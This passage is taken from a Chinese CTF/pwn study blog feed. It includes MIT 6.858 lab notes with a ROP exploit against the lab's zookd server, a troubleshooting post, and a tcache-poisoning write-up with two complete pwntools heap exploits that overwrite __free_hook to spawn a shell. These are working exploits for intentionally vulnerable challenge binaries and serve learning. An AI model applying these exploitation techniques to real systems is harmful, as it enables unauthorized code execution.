class="hljs-string">b&quot;hack: &quot;</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req += payload + <span class="hljs-string">b&quot;\r\n&quot;</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ make check-libc<br>./check-bin.sh<br>WARNING: bin.tar.gz might not have been built this year (2023);<br>WARNING: <span class="hljs-keyword">if</span> 2023 is correct, ask course staff to rebuild bin.tar.gz.<br>tar xf bin.tar.gz<br>./check-attack.sh zookd-nxstack ./exploit-5.py<br>PASS ./exploit-5.py<br></code></pre></td></tr></table></figure><p>但是我看了一下大佬的exp，（假设未知value和retaddr），用malloc分配一段地址，靠rax加偏移量去内容的指令完成写入字符串，然后把rax放到rdi里，调用unlink。</p><p>但是在我的libc里，向chunk写入字符串倒是能找到gadget，但是没法把rax挪到rdi里。找不到以rax为src，以任何一个寄存器（非取内容）为dst的<code>mov</code>指令，也找不到形如<code>pop_rax_push_xxx_ret</code>的东西。寄了（</p><p><del>我不李姐为什么同一个vmdk创建的虚拟机libc内容不一样？真不懂😭</del></p><p>对不起，看到lab2才发现他没用给的虚拟机</p><p>虽然但是，还是摆在这学习一下吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_malicious_request</span>():<br>    e = ELF(<span class="hljs-string">&#x27;./zookd-nxstack&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    <br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + <span class="hljs-number">0x11f497</span> <span class="hljs-comment"># &#x27;pop rdx ; ret&#x27; by search can&#x27;t be used</span><br>    pop_rcx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rcx ; ret&#x27;</span>)).__next__()<br>    ret = pop_rdi_ret + <span class="hljs-number">1</span><br>    copy_gadget = libc_base + <span class="hljs-number">0xc5163</span> <span class="hljs-comment"># mov qword ptr [rax + rdx - 8], rdi ; ret</span><br>    push_rax_pop_rbx_ret = libc_base + <span class="hljs-number">0x1750eb</span><br>    mov_rdi_rbx_call_rcx = libc_base + <span class="hljs-number">0x15e9d8</span><br>   <br>    func_malloc = libc_base + libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>    func_unlink = libc_base + libc.sym[<span class="hljs-string">&#x27;unlink&#x27;</span>]<br>    <span class="hljs-comment"># ret for slide</span><br>    payload  = <span class="hljs-number">512</span> * p64(ret)<br>    <span class="hljs-comment"># alloc a chunk to store the string</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x100</span>) + p64(func_malloc)<br>    <span class="hljs-comment"># copy string to chunk</span><br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x74732f656d6f682f</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x72672f746e656475</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x7478742e73656461</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(copy_gadget)<br>    <span class="hljs-comment"># call unlink(chunk)</span><br>    payload += p64(pop_rcx_ret) + p64(func_unlink)<br>    payload += p64(push_rax_pop_rbx_ret)<br>    payload += p64(mov_rdi_rbx_call_rcx)<br>    <span class="hljs-comment"># url encoding</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure><h4 id="lab1-exercise6"><a href="#lab1-exercise6" class="headerlink" title="lab1 exercise6"></a>lab1 exercise6</h4><p>题目让再找个漏洞，<del>这显然不是我会的</del></p><p>http_serve存在文件目录穿越漏洞。</p><p><img src="/img/mit6858/1.jpg"></p><h4 id="lab1-exercise7"><a href="#lab1-exercise7" class="headerlink" title="lab1 exercise7"></a>lab1 exercise7</h4><p>把value，envvar，reqpath数组大小全部改成8192就好了</p><p>make check-fixed之前的exp全部失效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">./check-crash.sh zookd-exstack ./exploit-2.py<br>./check-crash.sh: line 36:  2730 Killed                  <span class="hljs-variable">$2</span> <span class="hljs-variable">$HOST</span> <span class="hljs-variable">$PORT</span> &gt; /dev/null<br>FAIL ./exploit-2.py<br>./check-attack.sh zookd-exstack ./exploit-4.py<br>FAIL ./exploit-4.py<br>./check-attack.sh zookd-nxstack ./exploit-5.py<br>FAIL ./exploit-5.py<br><span class="hljs-built_in">rm</span> shellcode.o<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>遇到的奇奇怪怪问题汇总</title>
    <link href="/2023/12/05/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <url>/2023/12/05/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p><strong>vmware自带的vmtools安装了也复制不进来</strong></p><p>虚拟机执行命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure><p>如果拖放文件的时候出现了</p><p><img src="/img/problems/1.jpg"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/g</span>dm3/custom.conf<br></code></pre></td></tr></table></figure><p>将<code>WaylandEnable=false</code>注释掉</p><p>据说是vmware还没有支持ubutnu22.04的默认桌面Wayland</p><h4 id="sleep-？"><a href="#sleep-？" class="headerlink" title="sleep ？"></a>sleep ？</h4><p>题目：</p><p><a href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p><p>本来是很简单的一个溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure><p>但是不加sleep无法通过</p><p>有人说是python同时发送多个字符串时会合并(?)</p><p>那什么时候情况下需要在sendline前面加一个sleep</p><p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p><hr><h4 id="binwalk提取固件时快捷方式指向-dev-null"><a href="#binwalk提取固件时快捷方式指向-dev-null" class="headerlink" title="binwalk提取固件时快捷方式指向/dev/null"></a>binwalk提取固件时快捷方式指向/dev/null</h4><p>binwalk提取固件时会有一个warning</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WARNING: Symlink points outside of the extraction directory: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>dir815_FW_101<span class="hljs-regexp">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/htdocs/</span>web<span class="hljs-regexp">/dlcfg.cgi -&gt; /</span>htdocs<span class="hljs-regexp">/cgibin; changing link target to /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-keyword">for</span> security purposes.<br></code></pre></td></tr></table></figure><p>用到这个快捷方式时要修改一下</p><h4 id="sendlineafter的问题"><a href="#sendlineafter的问题" class="headerlink" title="sendlineafter的问题"></a>sendlineafter的问题</h4><p>要加上换行符<code>\n</code>，否则匹配不上</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sendlineafter</span>(b<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,...)<br></code></pre></td></tr></table></figure><h4 id="python调用c库函数"><a href="#python调用c库函数" class="headerlink" title="python调用c库函数"></a>python调用c库函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>libc.srand(<span class="hljs-number">0</span>)<br>libc.rand()%<span class="hljs-number">6</span> + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="安装ubuntu18，pwndbg安装不上（setup-sh总有问题）"><a href="#安装ubuntu18，pwndbg安装不上（setup-sh总有问题）" class="headerlink" title="安装ubuntu18，pwndbg安装不上（setup.sh总有问题）"></a>安装ubuntu18，pwndbg安装不上（setup.sh总有问题）</h4><p>选择用pwndbg release的安装包，安装之后把<code>/usr/bin/gdb</code>给改成<code>/usr/ bin/pwndbg</code>的软连接</p><p>然后在调用<code>gdb.attach</code>时弹不出来新的窗口：</p><p>采用tmux解决，安装tmux后，程序开头加上一句话</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br></code></pre></td></tr></table></figure><p>然后再命令行先运行sudo tmux，然后运行exp.py，就可以弹出来gdb了。</p><p>然后发现无法滚动鼠标，使用<code>ctrl + shift + b + :</code>进入命令模式，输入<code>set -g mouse on</code></p><p>就可以滚动终端了</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcache attack</title>
    <link href="/2023/12/01/ctf-pwn/tcache%20attack/"/>
    <url>/2023/12/01/ctf-pwn/tcache%20attack/</url>
    
    <content type="html"><![CDATA[<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>tcache poisioning指的是，修改管理tcache的chunk（就是那个chunk列表里那个大小为0x250，在最前面的）偏移0x10上的内容。</p><p>这里是存储每个bin中有多少个chunk的地方，全都改成7（tcache bin每个里最多7个chunk），这样再free的时候不管多大，都不会再进入tcache bin，然后就可以通过泄露unsorted bin，减96（因为有tcache），拿到mainarena，再减16拿到malloc_hook。</p><blockquote><p>以前不知道的是，如果某个bin里的chunk个数为0，但是指针非空，继续malloc，他会变成负的（</p><p>详见下文exp</p></blockquote><p>也算是uaf里的一类</p><h3 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h3><p><a href="https://buuoj.cn/challenges#ciscn_2019_es_1">https://buuoj.cn/challenges#ciscn_2019_es_1</a></p><p>这道题可以用tcache poisioning来让chunk free时直接进入unsorted bin，uaf泄露malloc hook</p><p>但是这道题应该是被魔改过的（</p><p>因为他 heap number 最大是 12，可以强行填满tcache（就不用poisioning了），并且输入的compary‘s call（它是不是想写company写错了。。。）并没有用上。。。所以才认为是一个魔改的题目</p><p>下面是这两种做法</p><h4 id="填满tcache"><a href="#填满tcache" class="headerlink" title="填满tcache"></a>填满tcache</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = process(<span class="hljs-string">&quot;./ciscn_2019_es_1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the size of compary&#x27;s name&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;please input name:&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">b&quot;please input compary call:&quot;</span>)<br>    p.send(<span class="hljs-string">b&#x27;123\x00&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 0</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 1</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 2</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 3</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 4</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 5</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 6</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 7</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 8</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment"># idx 9</span><br><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">3</span>)<br>    free(<span class="hljs-number">4</span>)<br>    free(<span class="hljs-number">5</span>)<br>    free(<span class="hljs-number">6</span>) <span class="hljs-comment"># tcache 的 0x80 位置被填满了</span><br>    <br>    free(<span class="hljs-number">7</span>)<br>    dump(<span class="hljs-number">7</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.success(<span class="hljs-string">&#x27;libc base leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    free(<span class="hljs-number">8</span>)<br>    free(<span class="hljs-number">8</span>)<br>    new(<span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))<br>    new(<span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>    free(<span class="hljs-number">9</span>)<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><h4 id="tcache-poisoning-1"><a href="#tcache-poisoning-1" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h4><p>一开始连续4次free 0 ，然后一次new拿走两个chunk，并将0.contend.fd设置为heapbase+0x10（tcache的链表指针指向content）</p><p>heapbase是泄露的heap地址取高12位（页的开头？）</p><p>第二次new的时候，第一个chunk还是0.content，第二个chunk就是heapbase开始的了，一个0和15个7，将除了0x20的bin全部填满，0x20的bin后面还要靠uaf改free_hook，不能置为7。</p><p>这时0x80的chunk free之后就会进入unsorted bin，之后就没区别了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = process(<span class="hljs-string">&quot;./ciscn_2019_es_1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the size of compary&#x27;s name&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;please input name:&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">b&quot;please input compary call:&quot;</span>)<br>    p.send(<span class="hljs-string">b&#x27;123\x00&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 0</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 1</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 2</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment"># idx 3</span><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">0</span>)<br>    dump(<span class="hljs-number">0</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;name:\n&#x27;</span>)<br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heap_base = heap_leak &amp; <span class="hljs-number">0xfffffffff000</span><br>    log.success(<span class="hljs-string">&#x27;heap base leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    new(<span class="hljs-number">0x10</span>, p64(heap_base + <span class="hljs-number">0x10</span>)) <span class="hljs-comment"># idx 4</span><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x07&#x27;</span> * <span class="hljs-number">0xf</span>) <span class="hljs-comment"># idx 5, hijack the tcache</span><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment"># 0.content.fd -&gt; base + 0x10, 5.content = base+0x10</span><br>    <span class="hljs-comment"># every tcache bin is full (num=7) ,except 0x20(num=0)</span><br>    free(<span class="hljs-number">2</span>)<br>    dump(<span class="hljs-number">2</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.success(<span class="hljs-string">&#x27;libc base leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">0</span>)<br>    new(<span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    new(<span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>    <span class="hljs-comment"># tcachebinis.0x20 = -2 ，也就是说即使计数的变量为0了，只要链表指针不空，就还能malloc</span><br>    gdb.attach(p)<br>    free(<span class="hljs-number">3</span>)<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><h2 id="tcache-key-泄露"><a href="#tcache-key-泄露" class="headerlink" title="tcache key 泄露"></a>tcache key 泄露</h2><p>在2.29版本以后，chunk被free到tcache之后，fd字段会指向tcache结构体（就是那个0x290的chunk），在free的时候看到bk=tcache，会检查tcache中是否有这个块</p><p>![](/img/tcache attack/1.jpg)</p><p>因此double free之前需要把这个字段给改掉，或者用它来泄露堆地址</p><h3 id="diary"><a href="#diary" class="headerlink" title="diary"></a>diary</h3><h2 